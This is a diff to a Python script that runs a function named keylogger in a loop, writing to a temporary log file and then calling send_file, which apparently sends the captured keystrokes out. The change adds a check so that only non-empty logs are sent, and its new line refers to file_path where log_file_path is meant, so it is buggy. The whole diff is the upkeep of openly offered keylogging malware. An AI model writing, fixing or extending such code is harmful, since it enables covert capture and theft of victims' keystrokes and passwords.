@@ -106,6 +106,9 @@ def keylogger(file, timeout):
 
     timer_thread.join()
 
+def is_file_empty(file_path):
+    return os.path.getsize(file_path) == 0
+
 temp_file = tempfile.NamedTemporaryFile(delete=False)
 log_file_path = temp_file.name
 print(log_file_path)
@@ -118,4 +121,5 @@ while True:
         break
     else:
         keylogger(log_file_path, 10)
-        send_file(log_file_path)
+        if not is_file_empty(file_path):
+            send_file(log_file_path)
